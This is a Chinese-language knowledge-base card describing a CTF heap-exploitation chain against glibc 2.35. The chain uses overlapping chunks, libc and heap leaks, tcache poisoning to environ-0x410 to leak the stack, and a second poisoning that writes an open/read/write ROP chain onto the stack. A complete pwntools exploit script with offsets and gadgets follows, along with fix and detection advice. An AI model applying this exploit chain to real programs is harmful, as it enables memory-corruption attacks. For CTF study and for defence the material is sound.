---
id: binary-pwn-heap-glibc235-environ-front-chunk-overread-stack-orw
title: glibc 2.35 堆题打栈：environ 前置 chunk 越界读泄栈、tcache 毒化栈帧写 ORW
type: scenario
domain: binary
path: binary/pwn/heap
technique: glibc235-environ-front-chunk-overread-tcache-stack-orw
tags:
- pwn
- heap
- glibc-2.35
- tcache
- safe-linking
- environ
- stack-leak
- stack-poison
- orw
- seccomp
- ctf
cve: []
severity: high
confidence: high
affected_versions: glibc 2.35（原文标记：2.35 堆题）
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V296
  verified_at: '2026-11-08T08:22:53+08:00'
  notes: 已对照原文与25张图核对：seccomp 白名单 read/write/open/mprotect(+exit)（图02）、add 的 idx 最小空闲分配+size<=0x500+memset+read（图03）、delete free 后清数组槽（图04）、edit 长度仅校验<=0x500（图05）、show 用 printf（图06）；exp 的 4x0x408+size 0x821 造重叠→unsorted main_arena+96 泄 libc（图07/09）、chunk_list[4] 与 [2] 别名→单元素 tcache fd 泄堆（图11-13）、fd 毒化到 environ-0x410（图14-16）、edit 0x40f 后 printf 越界读 environ 栈指针（图17-18/21）、add leave;ret 与 canary/rbp 伪 chunk 布局（图19-23）、二次毒化栈写 ORW 并打印 flag（图24-25）均与卡片一致。卡片对原文两处不准确描述做了更正：tcache 检查实为地址 0x10 对齐（aligned_OK），delete 本身非直接 UAF 而是 size 覆盖造重叠后索引别名。未验证点：未本机复跑，libc 偏移 0x21ace0/gadget/heap+0x16e0/0x1f00/stack-0x168 均依赖原文目标环境，换环境需重标定；affected_versions 为原文 glibc 2.35 环境标记保留；frontmatter 无 sources/source_url。dedup likely_duplicate 候选为 glibc 2.37 全局 ptr/size 结构体任意读写+system 链，与本卡 2.35 environ 前置 chunk 越界读+ORW 链机制不同，保留。
url: /docs/binary/pwn/heap/binary-pwn-heap-glibc235-environ-front-chunk-overread-stack-orw/
draft: false
kb_aliases:
- environ 打栈
- environ-0x410
- printf 越界读栈
- tcache 毒化栈帧
- glibc 2.35 堆题 ORW
- ciscn2024 ezheap
---

## 一句话结论

在 glibc 2.35、`__malloc_hook`/`__free_hook` 已移除且开启 seccomp（仅 ORW）的堆题里，先用长度不受限的 edit 改写相邻 chunk 的 size 制造重叠块，从 unsorted bin 泄 libc、从单元素 tcache fd 泄堆；再把 tcache fd 毒化到 `environ-0x410`，让 malloc 返回一个紧贴 `environ` 前的 chunk，用 `printf` 不遇 0 不停的特性越界读出 `environ` 中保存的栈指针；最后再次毒化 tcache 让 malloc 返回到 add 的返回地址区域，用 add 的 `read` 把 ORW ROP 写进栈帧，函数返回时读 flag。

## 原理

- **版本背景**：glibc 2.32 起 tcache/fastbin 的 `fd` 使用 safe-linking：`fd = next ^ (fd字段地址 >> 12)`；2.32 起 `tcache_get` 还检查目标地址 16 字节对齐，未对齐会报 `malloc(): unaligned tcache chunk detected`（原文把它描述为“size 最后一个字节为 00”，实际是 `aligned_OK(e)` 即 address & 0xf == 0）。2.34 起 `__malloc_hook`/`__free_hook` 等 hook 被移除，堆题控制执行流的主要落点转向栈返回地址、`exit_funcs`、IO/FSOP 等；本链选择栈。
- **重叠块制造 UAF**：add 最多申请 0x500，malloc 后 `memset(0)` 再 read；edit 的长度由用户控制，可越过本块写到相邻 chunk 头。把 chunk1 的 size 改成 `0x821`（覆盖 chunk1+chunk2 两个 0x410 块）后 `free(1)`，整段进入 unsorted bin；此时 `chunk_list[2]` 仍指向 chunk2 内部，形成“已释放但仍可索引”的悬挂指针。随后再 malloc 同尺寸会从 unsorted bin 切回 chunk1，chunk2 仍留在 unsorted bin，可用 `show(2)` 读其 `fd/bk`。
- **libc 泄露**：unsorted bin 中 chunk 的 `fd/bk` 指向 `main_arena+96`；`show(2)`（printf）读出 6 字节，减去目标 libc 的 `main_arena+96` 偏移即得 libc 基址（原文示例偏移 `0x21ace0`）。
- **堆地址泄露**：再次制造别名（新 malloc 返回 chunk2 的地址，使 `chunk_list[4]` 与 `chunk_list[2]` 指向同一物理块），`free(4)` 把它放入 tcache 0x410 链；当链中只有这一块时，其 `fd = NULL ^ (chunk_user >> 12) = chunk_user >> 12`，`show(2)` 读 5 字节后左移 12 位即得堆页基址。原文用 `heap_base+0x16e0 >> 12` 作为该 chunk 的 safe-linking 密钥。
- **environ 前置 chunk 泄栈**：把 tcache fd 毒化为 `(chunk_key) ^ (environ-0x410)`，连续两次 malloc 后第二次返回 `environ-0x410`。add 在 malloc 后会 `memset(ptr,0,size)`，若 chunk 数据区覆盖 `environ` 会把栈指针清零，所以必须把 chunk 起点放在 `environ` 前 0x410，使 `environ` 落在数据区之外；再用 edit 把数据区填满非 0 字节（如 0x40f 个 `a`），`show(6)` 的 printf 不会在块尾停止，继续读出 `environ` 处保存的 8 字节栈指针。
- **栈地址换算**：`environ` 保存的是初始栈上 `envp` 附近指针，减去固定偏移（原文 `0x168`）得到 add 函数 `leave; ret` 时的 `rsp+8`，即返回地址附近；该偏移依赖环境变量数量/长度，远端与本地环境不同需重新标定或爆破。
- **tcache 毒化栈帧写 ORW**：把 tcache fd 毒化为 `chunk_key ^ (stack_addr-0x10)`（目标需 0x10 对齐），malloc 返回该栈地址。伪造 chunk 的头部落在 canary/rbp 上，数据区从返回地址开始；add 的 memset 只清零数据区（不碰 canary/rbp），随后 read 把 ORW 链写到返回地址处，函数 epilogue 的 `leave; ret` 直接进入 ROP。
- **ORW 细节**：seccomp 只放行 read/write/open/mprotect，用 `pop rax; pop rdi; pop rsi; pop rdx/rbx; syscall` 原语依次 `open("./flag")`、`read(3, stack-0x300, 0x30)`、`write(1, stack-0x300, 0x30)`；不直接调用 libc wrapper，避免 wrapper 内部对栈的额外使用破坏已覆盖的栈帧。`./flag` 字符串放在 chunk 起始处，open 的路径参数指向该处。

## 触发条件

- x86-64 Linux，glibc 2.32+（原文环境 2.35），tcache 与 safe-linking 开启；程序启用 seccomp 仅允许 ORW（或类似限制，execve 不可用）。
- 菜单堆题具备：add（malloc+memset+read，size ≤0x500）、delete（free 后清数组槽，但可通过重叠块绕过）、edit（长度不校验，可越界写）、show（printf 输出，不遇 0 不停）。
- add 的索引分配策略为“取最小空闲下标”，释放后的下标会被复用，便于让两个下标指向同一物理块。
- 能拿到与目标一致的 libc（`environ`、`main_arena+96`、gadget 偏移）与稳定的堆布局偏移；栈偏移需按目标环境标定。
- 目标栈地址可供 tcache 分配（0x10 对齐检查通过）。

## 利用步骤

1. 申请 4 个 0x408 块（0-3，最后一块防 top 合并）；`edit(0, 0x500, b'a'*0x408 + p64(0x821))` 改 chunk1 的 size。
2. `free(1)` 把 chunk1+chunk2 作为 0x820 放入 unsorted bin；`add(0x408)` 切回 chunk1；`show(2)` 读 unsorted 的 `fd`，减 `main_arena+96` 偏移得 libc。
3. 再申请 4/5/6（0x408），使 4 与 2 别名；`free(4)` 后 `show(2)` 读单元素 tcache 的 `fd`，左移 12 位得堆页基址，按布局加偏移得毒化密钥。
4. 计算 `tar = environ - 0x410`、`fd = chunk_key ^ tar`；先 `free(6)` 布置 tcache，再用 edit 溢出改写 chunk5 的 `fd` 为该值；连续两次 `add(0x400)`，第二次返回 `tar`。
5. `edit(6, 0x500, b'a'*0x40f)` 填满 `environ` 前的数据区，`show(6)` 读 `environ` 处的栈指针；减固定偏移得返回地址附近 `stack_addr`。
6. 再次布置 tcache：申请 7-10（0x408），`free(9)`、`free(8)`，按已知 chunk 密钥把 fd 毒化为 `stack_addr-0x10`；edit 溢出改写对应块的 fd。
7. `add(0x408, b'a')` 消费链头，`add(0x408, orw)` 让 malloc 返回栈地址并把 ORW 链写入返回地址区域。
8. 让 add 正常返回（epilogue 使用未破坏的 canary/rbp），`ret` 进入 ORW，open/read/write 输出 flag。

## PoC

关键链路（偏移按目标 libc/环境重算；原文完整 exp 已打通）：

```python
# 1) libc：改 size 造重叠 -> unsorted bin
add(0x408, b'a'); add(0x408, b'a'); add(0x408, b'a'); add(0x408, b'a')
edit(0, 0x500, b'a'*0x408 + p64(0x821))
free(1)
add(0x408, b'a')
show(2)
io.recvuntil(b'content:')
libc_base = u64(io.recv(6).ljust(8, b'\x00')) - 0x21ace0

# 2) heap：单元素 tcache fd = chunk >> 12
add(0x408, b'a'); add(0x408, b'a'); add(0x408, b'a')
free(4)
show(2)
io.recvuntil(b'content:')
heap_page = u64(io.recv(5).ljust(8, b'\x00')) << 12

# 3) environ 前置 chunk：越界读泄栈
environ = libc_base + libc.sym['environ']
tar = environ - 0x410
key = (heap_page + 0x16e0) >> 12
fd = key ^ tar
free(6)
edit(5, 0x500, b'a'*0x400 + p64(0) + p64(0x411) + p64(fd))
add(0x400, b'a'); add(0x400, b'a')
edit(6, 0x500, b'a'*0x40f)
show(6)
stack_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x168

# 4) 第二次毒化到栈，写 ORW
pop_rdi = libc_base + 0x2a3e5
pop_rsi = libc_base + 0x2be51
pop_rdx_rbx = libc_base + 0x904a9
pop_rax = libc_base + 0x45eb0
syscall_ret = libc_base + 0x91316
orw  = b'./flag\x00\x00'
orw += p64(pop_rdi) + p64(stack_addr - 0x10) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall_ret)
orw += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(stack_addr - 0x300) + p64(pop_rdx_rbx) + p64(0x30)*2 + p64(syscall_ret)
orw += p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(stack_addr - 0x300) + p64(pop_rdx_rbx) + p64(0x30)*2 + p64(syscall_ret)

add(0x408, b'a'); add(0x408, b'a'); add(0x408, b'a'); add(0x408, b'a')
free(9); free(8)
fd2 = ((heap_page + 0x1f00) >> 12) ^ (stack_addr - 0x10)
edit(7, 0x500, b'a'*0x400 + p64(0) + p64(0x411) + p64(fd2))
add(0x408, b'a')
add(0x408, orw)
io.interactive()
```

说明：`environ` 值减 `0x168`、`heap_page+0x16e0/0x1f00`、libc gadget 偏移均为原文目标值；换 libc/换环境必须重新标定。栈目标要满足 tcache 的 0x10 对齐。

## 变体与关联

- **变体：不经 environ，直接用栈上残留 libc 指针**：若 show 能读出已释放块后的栈残留，可先毒化到栈读 libc，再二次毒化写 ROP。
- **变体：environ 对齐不足**：2.39 等版本 tcache 要求目标 0x10 对齐，若 `environ` 本身或其附近不满足，可选 libc 中存放栈指针的对齐地址，经 safe-linking 双重异或还原。
- **变体：最终载荷**：有 hook 的版本（<2.34）可打 `__free_hook`/`__malloc_hook`；无 seccomp 可直接 `system("/bin/sh")`；本卡因 seccomp 用 ORW。
- **关联卡片**：[[binary-pwn-heap-uaf-tcache-poison-global-environ-stack-rop]]（同为 UAF+tcache 毒化+environ+栈 ROP，但用全局 ptr/size 结构体做读写、无沙盒 system）；[[binary-pwn-heap-glibc235-tcache-key-clear-stack-poison-rop]]（2.35 tcache key 清零 + 栈毒化 ROP）；[[binary-pwn-heap-safe-linking-self-xor-heap-address]]（safe-linking 空链 fd 泄堆密钥的同族方法）；[[binary-pwn-heap-glibc235-offby-null-unlink-chunks-array-stack-rop]]（unlink 改写全局数组后读 `__environ` 泄栈）；[[binary-pwn-heap-tcache-safe-linking-stack-leak-chunk-to-stack]]（safe-linking fd 双重异或泄栈）。

## 检测与防御

- **修复**：edit 严格校验写入长度不超过原 chunk 容量；free 后立即置空所有别名指针（重叠块场景需做物理块级去重）；add 的 memset/read 使用实际分配大小并检查边界。
- **加固**：升级 glibc 跟进 safe-linking/tcache key；开启 PIE/ASLR/Full RELRO/Canary；seccomp 不要只限制 execve，应同时限制 open/read/write 或按业务收紧；敏感文件最小权限。
- **检测**：同一物理 chunk 被两个索引引用；tcache `fd` 解码后落在 `environ`/栈/libc 范围；malloc 返回栈地址；`unaligned tcache chunk detected` 报错；进程退出前栈上出现 `pop rdi; ret`/syscall 链。
- **分析**：先用 malloc/free 断点确认索引与物理块别名关系，再按 safe-linking 公式双向验算 fd；`environ` 偏移随环境变量变化，远端利用前需重新标定。
